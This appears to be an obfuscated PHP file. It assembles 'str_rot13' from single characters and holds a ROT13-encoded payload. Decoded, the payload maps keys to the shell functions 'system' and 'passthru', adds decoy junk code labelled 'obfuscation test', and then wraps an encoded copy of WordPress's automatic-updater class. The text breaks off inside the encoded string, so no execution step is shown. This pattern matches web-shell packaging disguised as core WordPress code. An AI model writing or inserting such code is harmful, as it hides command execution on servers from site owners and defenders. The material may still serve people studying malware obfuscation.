<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: JC_Nhgbzngvp_Hcqngre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe unaqyvat nhgbzngvp onpxtebhaq hcqngrf.
 *
 * @fvapr 3.7.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Nhgbzngvp_Hcqngre {

	/**
	 * Genpxf hcqngr erfhygf qhevat cebprffvat.
	 *
	 * @ine neenl
	 */
	cebgrpgrq $hcqngr_erfhygf = neenl();

	/**
	 * Qrgrezvarf jurgure gur ragver nhgbzngvp hcqngre vf qvfnoyrq.
	 *
	 * @fvapr 3.7.0
	 *
	 * @erghea obby Gehr vs gur nhgbzngvp hcqngre vf qvfnoyrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_qvfnoyrq() {
		// Onpxtebhaq hcqngrf ner qvfnoyrq vs lbh qba'g jnag svyr punatrf.
		vs ( ! jc_vf_svyr_zbq_nyybjrq( 'nhgbzngvp_hcqngre' ) ) {
			erghea gehr;
		}

		vs ( jc_vafgnyyvat() ) {
			erghea gehr;
		}

		// Zber svar tenvarq pbageby pna or qbar guebhtu gur JC_NHGB_HCQNGR_PBER pbafgnag naq svygref.
		$qvfnoyrq = qrsvarq( 'NHGBZNGVP_HCQNGRE_QVFNOYRQ' ) && NHGBZNGVP_HCQNGRE_QVFNOYRQ;

		/**
		 * Svygref jurgure gb ragveryl qvfnoyr onpxtebhaq hcqngrf.
		 *
		 * Gurer ner zber svar-tenvarq svygref naq pbagebyf sbe fryrpgvir qvfnoyvat.
		 * Guvf svygre cnenyyryf gur NHGBZNGVP_HCQNGRE_QVFNOYRQ pbafgnag va anzr.
		 *
		 * Guvf nyfb qvfnoyrf hcqngr abgvsvpngvba rznvyf. Gung znl punatr va gur shgher.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz obby $qvfnoyrq Jurgure gur hcqngre fubhyq or qvfnoyrq.
		 */
		erghea nccyl_svygref( 'nhgbzngvp_hcqngre_qvfnoyrq', $qvfnoyrq );
	}

	/**
	 * Purpxf jurgure npprff gb n tvira qverpgbel vf nyybjrq.
	 *
	 * Guvf vf hfrq jura qrgrpgvat irefvba pbageby purpxbhgf. Gnxrf vagb nppbhag
	 * gur CUC `bcra_onfrqve` erfgevpgvbaf, fb gung JbeqCerff qbrf abg gel gb npprff
	 * qverpgbevrf vg vf abg nyybjrq gb.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $qve Gur qverpgbel gb purpx.
	 * @erghea obby Gehr vs npprff gb gur qverpgbel vf nyybjrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_nyybjrq_qve( $qve ) {
		vs ( vf_fgevat( $qve ) ) {
			$qve = gevz( $qve );
		}

		vs ( ! vf_fgevat( $qve ) || '' === $qve ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: Gur \"$qve\" nethzrag. */
					__( 'Gur \"%f\" nethzrag zhfg or n aba-rzcgl fgevat.' ),
					'$qve'
				),
				'6.2.0'
			);

			erghea snyfr;
		}

		$bcra_onfrqve = vav_trg( 'bcra_onfrqve' );

		vs ( rzcgl( $bcra_onfrqve ) ) {
			erghea gehr;
		}

		$bcra_onfrqve_yvfg = rkcybqr( CNGU_FRCNENGBE, $bcra_onfrqve );

		sbernpu ( $bcra_onfrqve_yvfg nf $onfrqve ) {
			vs ( '' !== gevz( $onfrqve ) && fge_fgnegf_jvgu( $qve, $onfrqve ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Purpxf sbe irefvba pbageby purpxbhgf.
	 *
	 * Purpxf sbe Fhoirefvba, Tvg, Zrephevny, naq Onmnne. Vg erphefviryl ybbxf hc gur
	 * svyrflfgrz gb gur gbc bs gur qevir, reevat ba gur fvqr bs qrgrpgvat n IPF
	 * purpxbhg fbzrjurer.
	 *
	 * NOFCNGU vf nyjnlf purpxrq va nqqvgvba gb jungrire `$pbagrkg` vf (juvpu znl or gur
	 * jc-pbagrag qverpgbel, sbe rknzcyr). Gur haqreylvat nffhzcgvba vf gung vs lbh ner
	 * hfvat irefvba pbageby *naljurer*, gura lbh fubhyq or znxvat qrpvfvbaf sbe
	 * ubj guvatf trg hcqngrq.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat $pbagrkg Gur svyrflfgrz cngu gb purpx, va nqqvgvba gb NOFCNGU.
	 * @erghea obby Gehr vs n IPF purpxbhg jnf qvfpbirerq ng `$pbagrkg` be NOFCNGU,
	 *              be naljurer uvture. Snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ipf_purpxbhg( $pbagrkg ) {
		$pbagrkg_qvef = neenl( hagenvyvatfynfuvg( $pbagrkg ) );
		vs ( NOFCNGU !== $pbagrkg ) {
			$pbagrkg_qvef[] = hagenvyvatfynfuvg( NOFCNGU );
		}

		$ipf_qvef   = neenl( '.fia', '.tvg', '.ut', '.ome' );
		$purpx_qvef = neenl();

		sbernpu ( $pbagrkg_qvef nf $pbagrkg_qve ) {
			// Jnyx hc sebz $pbagrkg_qve gb gur ebbg.
			qb {
				$purpx_qvef[] = $pbagrkg_qve;

				// Bapr jr'ir uvg '/' be 'P:\', jr arrq gb fgbc. qveanzr jvyy xrrc ergheavat gur vachg urer.
				vs ( qveanzr( $pbagrkg_qve ) === $pbagrkg_qve ) {
					oernx;
				}

				// Pbagvahr bar yriry ng n gvzr.
			} juvyr ( $pbagrkg_qve = qveanzr( $pbagrkg_qve ) );
		}

		$purpx_qvef = neenl_havdhr( $purpx_qvef );
		$purpxbhg   = snyfr;

		// Frnepu nyy qverpgbevrf jr'ir sbhaq sbe rivqrapr bs irefvba pbageby.
		sbernpu ( $ipf_qvef nf $ipf_qve ) {
			sbernpu ( $purpx_qvef nf $purpx_qve ) {
				vs ( ! $guvf->vf_nyybjrq_qve( $purpx_qve ) ) {
					pbagvahr;
				}

				$purpxbhg = vf_qve( egevz( $purpx_qve, '\\/' ) . \"/$ipf_qve\" );
				vs ( $purpxbhg ) {
					oernx 2;
				}
			}
		}

		/**
		 * Svygref jurgure gur nhgbzngvp hcqngre fubhyq pbafvqre n svyrflfgrz
		 * ybpngvba gb or cbgragvnyyl znantrq ol n irefvba pbageby flfgrz.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz obby $purpxbhg  Jurgure n IPF purpxbhg jnf qvfpbirerq ng `$pbagrkg`
		 *                        be NOFCNGU, be naljurer uvture.
		 * @cnenz fgevat $pbagrkg Gur svyrflfgrz pbagrkg (n cngu) ntnvafg juvpu
		 *                        svyrflfgrz fgnghf fubhyq or purpxrq.
		 */
		erghea nccyl_svygref( 'nhgbzngvp_hcqngrf_vf_ipf_purpxbhg', $purpxbhg, $pbagrkg );
	}

	/**
	 * Grfgf gb frr vs jr pna naq fubhyq hcqngr n fcrpvsvp vgrz.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $glcr    Gur glcr bs hcqngr orvat purpxrq: 'pber', 'gurzr',
	 *                        'cyhtva', 'genafyngvba'.
	 * @cnenz bowrpg $vgrz    Gur hcqngr bssre.
	 * @cnenz fgevat $pbagrkg Gur svyrflfgrz pbagrkg (n cngu) ntnvafg juvpu svyrflfgrz
	 *                        npprff naq fgnghf fubhyq or purpxrq.
	 * @erghea obby Gehr vs gur vgrz fubhyq or hcqngrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba fubhyq_hcqngr( $glcr, $vgrz, $pbagrkg ) {
		// Hfrq gb frr vs JC_Svyrflfgrz vf frg hc gb nyybj hanggraqrq hcqngrf.
		$fxva = arj Nhgbzngvp_Hctenqre_Fxva();

		vs ( $guvf->vf_qvfnoyrq() ) {
			erghea snyfr;
		}

		// Bayl erynk gur svyrflfgrz purpxf jura gur hcqngr qbrfa'g vapyhqr arj svyrf.
		$nyybj_erynkrq_svyr_bjarefuvc = snyfr;
		vs ( 'pber' === $glcr && vffrg( $vgrz->arj_svyrf ) && ! $vgrz->arj_svyrf ) {
			$nyybj_erynkrq_svyr_bjarefuvc = gehr;
		}

		// Vs jr pna'g qb na nhgb pber hcqngr, jr znl fgvyy or noyr gb rznvy gur hfre.
		vs ( ! $fxva->erdhrfg_svyrflfgrz_perqragvnyf( snyfr, $pbagrkg, $nyybj_erynkrq_svyr_bjarefuvc )
			|| $guvf->vf_ipf_purpxbhg( $pbagrkg )
		) {
			vs ( 'pber' === $glcr ) {
				$guvf->fraq_pber_hcqngr_abgvsvpngvba_rznvy( $vgrz );
			}
			erghea snyfr;
		}

		// Arkg hc, vf guvf na vgrz jr pna hcqngr?
		vs ( 'pber' === $glcr ) {
			$hcqngr = Pber_Hctenqre::fubhyq_hcqngr_gb_irefvba( $vgrz->pheerag );
		} ryfrvs ( 'cyhtva' === $glcr || 'gurzr' === $glcr ) {
			$hcqngr = ! rzcgl( $vgrz->nhgbhcqngr );

			vs ( ! $hcqngr && jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( $glcr ) ) {
				// Purpx vs gur fvgr nqzva unf ranoyrq nhgb-hcqngrf ol qrsnhyg sbe gur fcrpvsvp vgrz.
				$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( \"nhgb_hcqngr_{$glcr}f\", neenl() );
				$hcqngr       = va_neenl( $vgrz->{$glcr}, $nhgb_hcqngrf, gehr );
			}
		} ryfr {
			$hcqngr = ! rzcgl( $vgrz->nhgbhcqngr );
		}

		// Vs gur `qvfnoyr_nhgbhcqngr` synt vf frg, bireevqr nal hfre-pubvpr, ohg nyybj svygref.
		vs ( ! rzcgl( $vgrz->qvfnoyr_nhgbhcqngr ) ) {
			$hcqngr = snyfr;
		}

		/**
		 * Svygref jurgure gb nhgbzngvpnyyl hcqngr pber, n cyhtva, n gurzr, be n ynathntr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$glcr`, ersref gb gur glcr bs hcqngr
		 * orvat purpxrq.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `nhgb_hcqngr_pber`
		 *  - `nhgb_hcqngr_cyhtva`
		 *  - `nhgb_hcqngr_gurzr`
		 *  - `nhgb_hcqngr_genafyngvba`
		 *
		 * Fvapr JbeqCerff 3.7, zvabe naq qrirybczrag irefvbaf bs pber, naq genafyngvbaf unir
		 * orra nhgb-hcqngrq ol qrsnhyg. Arj vafgnyyf ba JbeqCerff 5.6 be uvture jvyy nyfb
		 * nhgb-hcqngr znwbe irefvbaf ol qrsnhyg. Fgnegvat va 5.6, byqre fvgrf pna bcg-va gb
		 * znwbe irefvba nhgb-hcqngrf, naq nhgb-hcqngrf sbe cyhtvaf naq gurzrf.
		 *
		 * Frr gur {@frr 'nyybj_qri_nhgb_pber_hcqngrf'}, {@frr 'nyybj_zvabe_nhgb_pber_hcqngrf'},
		 * naq {@frr 'nyybj_znwbe_nhgb_pber_hcqngrf'} svygref sbe n zber fgenvtugsbejneq jnl gb
		 * nqwhfg pber hcqngrf.
		 *
		 * @fvapr 3.7.0
		 * @fvapr 5.5.0 Gur `$hcqngr` cnenzrgre npprcgf gur inyhr bs ahyy.
		 *
		 * @cnenz obby|ahyy $hcqngr Jurgure gb hcqngr. Gur inyhr bs ahyy vf vagreanyyl hfrq
		 *                          gb qrgrpg jurgure abguvat unf ubbxrq vagb guvf svygre.
		 * @cnenz bowrpg    $vgrz   Gur hcqngr bssre.
		 */
		$hcqngr = nccyl_svygref( \"nhgb_hcqngr_{$glcr}\", $hcqngr, $vgrz );

		vs ( ! $hcqngr ) {
			vs ( 'pber' === $glcr ) {
				$guvf->fraq_pber_hcqngr_abgvsvpngvba_rznvy( $vgrz );
			}
			erghea snyfr;
		}

		// Vs vg'f n pber hcqngr, ner jr npghnyyl pbzcngvoyr jvgu vgf erdhverzragf?
		vs ( 'pber' === $glcr ) {
			tybony $jcqo;

			$cuc_pbzcng = irefvba_pbzcner( CUC_IREFVBA, $vgrz->cuc_irefvba, '>=' );
			vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/qo.cuc' ) && rzcgl( $jcqo->vf_zlfdy ) ) {
				$zlfdy_pbzcng = gehr;
			} ryfr {
				$zlfdy_pbzcng = irefvba_pbzcner( $jcqo->qo_irefvba(), $vgrz->zlfdy_irefvba, '>=' );
			}

			vs ( ! $cuc_pbzcng || ! $zlfdy_pbzcng ) {
				erghea snyfr;
			}
		}

		// Vs hcqngvat n cyhtva be gurzr, rafher gur zvavzhz CUC irefvba erdhverzragf ner fngvfsvrq.
		vs ( va_neenl( $glcr, neenl( 'cyhtva', 'gurzr' ), gehr ) ) {
			vs ( ! rzcgl( $vgrz->erdhverf_cuc ) && irefvba_pbzcner( CUC_IREFVBA, $vgrz->erdhverf_cuc, '<' ) ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}

	/**
	 * Abgvsvrf na nqzvavfgengbe bs n pber hcqngr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz bowrpg $vgrz Gur hcqngr bssre.
	 * @erghea obby Gehr vs gur fvgr nqzvavfgengbe vf abgvsvrq bs n pber hcqngr,
	 *              snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba fraq_pber_hcqngr_abgvsvpngvba_rznvy( $vgrz ) {
		$abgvsvrq = trg_fvgr_bcgvba( 'nhgb_pber_hcqngr_abgvsvrq' );

		// Qba'g abgvsl vs jr'ir nyernql abgvsvrq gur fnzr rznvy nqqerff bs gur fnzr irefvba.
		vs ( $abgvsvrq
			&& trg_fvgr_bcgvba( 'nqzva_rznvy' ) === $abgvsvrq['rznvy']
			&& $abgvsvrq['irefvba'] === $vgrz->pheerag
		) {
			erghea snyfr;
		}

		// Frr vs jr arrq gb abgvsl hfref bs n pber hcqngr.
		$abgvsl = ! rzcgl( $vgrz->abgvsl_rznvy );

		/**
		 * Svygref jurgure gb abgvsl gur fvgr nqzvavfgengbe bs n arj pber hcqngr.
		 *
		 * Ol qrsnhyg, nqzvavfgengbef ner abgvsvrq jura gur hcqngr bssre erprvirq
		 * sebz JbeqCerff.bet frgf n cnegvphyne synt. Guvf nyybjf fbzr qvfpergvba
		 * va vs naq jura gb abgvsl.
		 *
		 * Guvf svygre vf bayl rinyhngrq bapr cre eryrnfr. Vs gur fnzr rznvy nqqerff
		 * jnf nyernql abgvsvrq bs gur fnzr arj irefvba, JbeqCerff jba'g ercrngrqyl
		 * rznvy gur nqzvavfgengbe.
		 *
		 * Guvf svygre vf nyfb hfrq ba nobhg.cuc gb purpx vs n cyhtva unf qvfnoyrq
		 * gurfr abgvsvpngvbaf.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz obby   $abgvsl Jurgure gur fvgr nqzvavfgengbe vf abgvsvrq.
		 * @cnenz bowrpg $vgrz   Gur hcqngr bssre.
		 */
		vs ( ! nccyl_svygref( 'fraq_pber_hcqngr_abgvsvpngvba_rznvy', $abgvsl, $vgrz ) ) {
			erghea snyfr;
		}

		$guvf->fraq_rznvy( 'znahny', $vgrz );
		erghea gehr;
	}

	/**
	 * Hcqngrf na vgrz, vs nccebcevngr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat $glcr Gur glcr bs hcqngr orvat purpxrq: 'pber', 'gurzr', 'cyhtva', 'genafyngvba'.
	 * @cnenz bowrpg $vgrz Gur hcqngr bssre.
	 * @erghea ahyy|JC_Reebe
	 */
	choyvp shapgvba hcqngr( $glcr, $vgrz ) {
		$fxva = arj Nhgbzngvp_Hctenqre_Fxva();

		fjvgpu ( $glcr ) {
			pnfr 'pber':
				// Gur Pber hctenqre qbrfa'g hfr gur Hctenqre'f fxva qhevat gur npghny znva cneg bs gur hctenqr, vafgrnq, svevat n svygre.
				nqq_svygre( 'hcqngr_srrqonpx', neenl( $fxva, 'srrqonpx' ) );
				$hctenqre = arj Pber_Hctenqre( $fxva );
				$pbagrkg  = NOFCNGU;
				oernx;
			pnfr 'cyhtva':
				$hctenqre = arj Cyhtva_Hctenqre( $fxva );
				$pbagrkg  = JC_CYHTVA_QVE; // Jr qba'g fhccbeg phfgbz Cyhtva qverpgbevrf, be hcqngrf sbe JCZH_CYHTVA_QVE.
				oernx;
			pnfr 'gurzr':
				$hctenqre = arj Gurzr_Hctenqre( $fxva );
				$pbagrkg  = trg_gurzr_ebbg( $vgrz->gurzr );
				oernx;
			pnfr 'genafyngvba':
				$hctenqre = arj Ynathntr_Cnpx_Hctenqre( $fxva );
				$pbagrkg  = JC_PBAGRAG_QVE; // JC_YNAT_QVE;
				oernx;
		}

		// Qrgrezvar jurgure jr pna naq fubhyq cresbez guvf hcqngr.
		vs ( ! $guvf->fubhyq_hcqngr( $glcr, $vgrz, $pbagrkg ) ) {
			erghea snyfr;
		}

		/**
		 * Sverf vzzrqvngryl cevbe gb na nhgb-hcqngr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat $glcr    Gur glcr bs hcqngr orvat purpxrq: 'pber', 'gurzr', 'cyhtva', be 'genafyngvba'.
		 * @cnenz bowrpg $vgrz    Gur hcqngr bssre.
		 * @cnenz fgevat $pbagrkg Gur svyrflfgrz pbagrkg (n cngu) ntnvafg juvpu svyrflfgrz npprff naq fgnghf
		 *                        fubhyq or purpxrq.
		 */
		qb_npgvba( 'cer_nhgb_hcqngr', $glcr, $vgrz, $pbagrkg );

		$hctenqre_vgrz = $vgrz;
		fjvgpu ( $glcr ) {
			pnfr 'pber':
				/* genafyngbef: %f: JbeqCerff irefvba. */
				$fxva->srrqonpx( __( 'Hcqngvat gb JbeqCerff %f' ), $vgrz->irefvba );
				/* genafyngbef: %f: JbeqCerff irefvba. */
				$vgrz_anzr = fcevags( __( 'JbeqCerff %f' ), $vgrz->irefvba );
				oernx;
			pnfr 'gurzr':
				$hctenqre_vgrz = $vgrz->gurzr;
				$gurzr         = jc_trg_gurzr( $hctenqre_vgrz );
				$vgrz_anzr     = $gurzr->trg( 'Anzr' );
				// Nqq gur pheerag irefvba fb gung vg pna or ercbegrq va gur abgvsvpngvba rznvy.
				$vgrz->pheerag_irefvba = $gurzr->trg( 'Irefvba' );
				vs ( rzcgl( $vgrz->pheerag_irefvba ) ) {
					$vgrz->pheerag_irefvba = snyfr;
				}
				/* genafyngbef: %f: Gurzr anzr. */
				$fxva->srrqonpx( __( 'Hcqngvat gurzr: %f' ), $vgrz_anzr );
				oernx;
			pnfr 'cyhtva':
				$hctenqre_vgrz = $vgrz->cyhtva;
				$cyhtva_qngn   = trg_cyhtva_qngn( $pbagrkg . '/' . $hctenqre_vgrz );
				$vgrz_anzr     = $cyhtva_qngn['Anzr'];
				// Nqq gur pheerag irefvba fb gung vg pna or ercbegrq va gur abgvsvpngvba rznvy.
				$vgrz->pheerag_irefvba = $cyhtva_qngn['Irefvba'];
				vs ( rzcgl( $vgrz->pheerag_irefvba ) ) {
					$vgrz->pheerag_irefvba = snyfr;
				}
				/* genafyngbef: %f: Cyhtva anzr. */
				$fxva->srrqonpx( __( 'Hcqngvat cyhtva: %f' ), $vgrz_anzr );
				oernx;
			pnfr 'genafyngvba':
				$ynathntr_vgrz_anzr = $hctenqre->trg_anzr_sbe_hcqngr( $vgrz );
				/* genafyngbef: %f: Cebwrpg anzr (cyhtva, gurzr, be JbeqCerff). */
				$vgrz_anzr = fcevags( __( 'Genafyngvbaf sbe %f' ), $ynathntr_vgrz_anzr );
				/* genafyngbef: 1: Cebwrpg anzr (cyhtva, gurzr, be JbeqCerff), 2: Ynathntr. */
				$fxva->srrqonpx( fcevags( __( 'Hcqngvat genafyngvbaf sbe %1$f (%2$f)&#8230;' ), $ynathntr_vgrz_anzr, $vgrz->ynathntr ) );
				oernx;
		}

		$nyybj_erynkrq_svyr_bjarefuvc = snyfr;
		vs ( 'pber' === $glcr && vffrg( $vgrz->arj_svyrf ) && ! $vgrz->arj_svyrf ) {
			$nyybj_erynkrq_svyr_bjarefuvc = gehr;
		}

		$vf_qroht = JC_QROHT && JC_QROHT_YBT;
		vs ( 'cyhtva' === $glcr ) {
			$jnf_npgvir = vf_cyhtva_npgvir( $hctenqre_vgrz );
			vs ( $vf_qroht ) {
				reebe_ybt( '    Hctenqvat cyhtva ' . ine_rkcbeg( $vgrz->fyht, gehr ) . '...' );
			}
		}

		vs ( 'gurzr' === $glcr && $vf_qroht ) {
			reebe_ybt( '    Hctenqvat gurzr ' . ine_rkcbeg( $vgrz->gurzr, gehr ) . '...' );
		}

		/*
		 * Ranoyr znvagranapr zbqr orsber hctenqvat gur cyhtva be gurzr.
		 *
		 * Guvf nibvqf cbgragvny aba-sngny reebef orvat qrgrpgrq
		 * juvyr fpencvat sbe n sngny reebe vs fbzr svyrf ner fgvyy
		 * orvat zbirq.
		 *
		 * Juvyr gurfr purpxf ner vagraqrq bayl sbe cyhtvaf,
		 * znvagranapr zbqr vf ranoyrq sbe nyy hctenqr glcrf nf nal
		 * hcqngr pbhyq pbagnva na reebe be jneavat, juvpu pbhyq pnhfr
		 * gur fpencr gb zvff n sngny reebe va gur cyhtva hcqngr.
		 */
		vs ( 'genafyngvba' !== $glcr ) {
			$hctenqre->znvagranapr_zbqr( gehr );
		}

		// Obbz, guvf fvgr'f nobhg gb trg n jubyr arj fcynfu bs cnvag!
		$hctenqr_erfhyg = $hctenqre->hctenqr(
			$hctenqre_vgrz,
			neenl(
				'pyrne_hcqngr_pnpur'           => snyfr,
				// Nyjnlf hfr cnegvny ohvyqf vs cbffvoyr sbe pber hcqngrf.
				'cer_purpx_zq5'                => snyfr,
				// Bayl ninvynoyr sbe pber hcqngrf.
				'nggrzcg_ebyyonpx'             => gehr,
				// Nyybj erynkrq svyr bjarefuvc va fbzr fpranevbf.
				'nyybj_erynkrq_svyr_bjarefuvc' => $nyybj_erynkrq_svyr_bjarefuvc,
			)
		);

		/*
		 * Nsgre JC_Hctenqre::hctenqr() pbzcyrgrf, znvagranapr zbqr vf qvfnoyrq.
		 *
		 * Er-ranoyr znvagranapr zbqr juvyr nggrzcgvat gb qrgrpg sngny reebef
		 * naq cbgragvnyyl ebyyvat onpx.
		 *
		 * Guvf nibvqf reebef vs gur fvgr vf ivfvgrq juvyr sngny reebef rkvfg
		 * be juvyr svyrf ner fgvyy orvat zbirq.
		 */
		vs ( 'genafyngvba' !== $glcr ) {
			$hctenqre->znvagranapr_zbqr( gehr );
		}

		// Vs gur svyrflfgrz vf haninvynoyr, snyfr vf erghearq.
		vs ( snyfr === $hctenqr_erfhyg ) {
			$hctenqr_erfhyg = arj JC_Reebe( 'sf_haninvynoyr', __( 'Pbhyq abg npprff svyrflfgrz.' ) );
		}

		vs ( 'pber' === $glcr ) {
			vs ( vf_jc_reebe( $hctenqr_erfhyg )
				&& ( 'hc_gb_qngr' === $hctenqr_erfhyg->trg_reebe_pbqr()
					|| 'ybpxrq' === $hctenqr_erfhyg->trg_reebe_pbqr() )
			) {
				// Nyybj ivfvgbef gb oebjfr gur fvgr ntnva.
				$hctenqre->znvagranapr_zbqr( snyfr );

				/*
				 * Gurfr nera'g npghny reebef, gerng vg nf n fxvccrq-hcqngr vafgrnq
				 * gb nibvq gevttrevat gur cbfg-pber hcqngr snvyher ebhgvarf.
				 */
				erghea snyfr;
			}

			// Pber qbrfa'g bhgchg guvf, fb yrg'f nccraq vg, fb jr qba'g trg pbashfrq.
			vs ( vf_jc_reebe( $hctenqr_erfhyg ) ) {
				$hctenqr_erfhyg->nqq( 'vafgnyyngvba_snvyrq', __( 'Vafgnyyngvba snvyrq.' ) );
				$fxva->reebe( $hctenqr_erfhyg );
			} ryfr {
				$fxva->srrqonpx( __( 'JbeqCerff hcqngrq fhpprffshyyl.' ) );
			}
		}

		$vf_qroht = JC_QROHT && JC_QROHT_YBT;

		vs ( 'gurzr' === $glcr && $vf_qroht ) {
			reebe_ybt( '    Gurzr ' . ine_rkcbeg( $vgrz->gurzr, gehr ) . ' unf orra hctenqrq.' );
		}

		vs ( 'cyhtva' === $glcr ) {
			vs ( $vf_qroht ) {
				reebe_ybt( '    Cyhtva ' . ine_rkcbeg( $vgrz->fyht, gehr ) . ' unf orra hctenqrq.' );
				vs ( vf_cyhtva_vanpgvir( $hctenqre_vgrz ) ) {
					reebe_ybt( '    ' . ine_rkcbeg( $hctenqre_vgrz, gehr ) . ' vf vanpgvir naq jvyy abg or purpxrq sbe sngny reebef.' );
				}
			}

			vs ( $jnf_npgvir && ! vf_jc_reebe( $hctenqr_erfhyg ) ) {

				/*
				 * Gur hfhny gvzr yvzvg vf svir zvahgrf. Ubjrire, nf n ybbconpx erdhrfg
				 * vf nobhg gb or cresbezrq, vapernfr gur gvzr yvzvg gb nppbhag sbe guvf.
				 */
				vs ( shapgvba_rkvfgf( 'frg_gvzr_yvzvg' ) ) {
					frg_gvzr_yvzvg( 10 * ZVAHGR_VA_FRPBAQF );
				}

				/*
				 * Nibvqf n enpr pbaqvgvba jura gurer ner 2 frdhragvny cyhtvaf gung unir
				 * sngny reebef. Vg frrzf n fyvtug qrynl vf erdhverq sbe gur ybbconpx gb
				 * hfr gur hcqngrq cyhtva pbqr va gur erdhrfg. Guvf pna pnhfr gur frpbaq
				 * cyhtva'f sngny reebe purpxvat gb or vanpphengr, naq znl nyfb nssrpg
				 * fhofrdhrag cyhtva purpxf.
				 */
				fyrrc( 2 );

				vs ( $guvf->unf_sngny_reebe() ) {
					$hctenqr_erfhyg = arj JC_Reebe();
					$grzc_onpxhc    = neenl(
						neenl(
							'qve'  => 'cyhtvaf',
							'fyht' => $vgrz->fyht,
							'fep'  => JC_CYHTVA_QVE,
						),
					);

					$onpxhc_erfgberq = $hctenqre->erfgber_grzc_onpxhc( $grzc_onpxhc );
					vs ( vf_jc_reebe( $onpxhc_erfgberq ) ) {
						$hctenqr_erfhyg->nqq(
							'cyhtva_hcqngr_sngny_reebe_ebyyonpx_snvyrq',
							fcevags(
								/* genafyngbef: %f: Gur cyhtva'f fyht. */
								__( \"Gur hcqngr sbe '%f' pbagnvarq n sngny reebe. Gur cerivbhfyl vafgnyyrq irefvba pbhyq abg or erfgberq.\" ),
								$vgrz->fyht
							)
						);

						$hctenqr_erfhyg->zretr_sebz( $onpxhc_erfgberq );
					} ryfr {
						$hctenqr_erfhyg->nqq(
							'cyhtva_hcqngr_sngny_reebe_ebyyonpx_fhpprffshy',
							fcevags(
								/* genafyngbef: %f: Gur cyhtva'f fyht. */
								__( \"Gur hcqngr sbe '%f' pbagnvarq n sngny reebe. Gur cerivbhfyl vafgnyyrq irefvba unf orra erfgberq.\" ),
								$vgrz->fyht
							)
						);

						$onpxhc_qryrgrq = $hctenqre->qryrgr_grzc_onpxhc( $grzc_onpxhc );
						vs ( vf_jc_reebe( $onpxhc_qryrgrq ) ) {
							$hctenqr_erfhyg->zretr_sebz( $onpxhc_qryrgrq );
						}
					}

					/*
					 * Fubhyq rznvyf abg or jbexvat, ybt gur zrffntr(f) fb gung
					 * gur ybt svyr pbagnvaf pbagrkg sbe gur sngny reebe,
					 * naq jurgure n ebyyonpx jnf cresbezrq.
					 *
					 * `gevttre_reebe()` vf abg hfrq nf vg bhgchgf n fgnpx genpr
					 * gb guvf ybpngvba engure guna gb gur sngny reebe, juvpu jvyy
					 * nccrne nobir guvf ragel va gur ybt svyr.
					 */
					vs ( $vf_qroht ) {
						reebe_ybt( '    ' . vzcybqr( \"\a\", $hctenqr_erfhyg->trg_reebe_zrffntrf() ) );
					}
				} ryfrvs ( $vf_qroht ) {
					reebe_ybt( '    Gur hcqngr sbe ' . ine_rkcbeg( $vgrz->fyht, gehr ) . ' unf ab sngny reebef.' );
				}
			}
		}

		// Nyy cebprffrf ner pbzcyrgr. Nyybj ivfvgbef gb oebjfr gur fvgr ntnva.
		vs ( 'genafyngvba' !== $glcr ) {
			$hctenqre->znvagranapr_zbqr( snyfr );
		}

		$guvf->hcqngr_erfhygf[ $glcr ][] = (bowrpg) neenl(
			'vgrz'     => $vgrz,
			'erfhyg'   => $hctenqr_erfhyg,
			'anzr'     => $vgrz_anzr,
			'zrffntrf' => $fxva->trg_hctenqr_zrffntrf(),
		);

		erghea $hctenqr_erfhyg;
	}

	/**
	 * Xvpxf bss gur onpxtebhaq hcqngr cebprff, ybbcvat guebhtu nyy craqvat hcqngrf.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba eha() {
		vs ( $guvf->vf_qvfnoyrq() ) {
			erghea;
		}

		vs ( ! vf_znva_argjbex() || ! vf_znva_fvgr() ) {
			erghea;
		}

		vs ( ! JC_Hctenqre::perngr_ybpx( 'nhgb_hcqngre' ) ) {
			erghea;
		}

		$vf_qroht = JC_QROHT && JC_QROHT_YBT;

		vs ( $vf_qroht ) {
			reebe_ybt( 'Nhgbzngvp hcqngrf fgnegvat...' );
		}

		// Qba'g nhgbzngvpnyyl eha gurfr guvatf, nf jr'yy unaqyr vg bhefryirf.
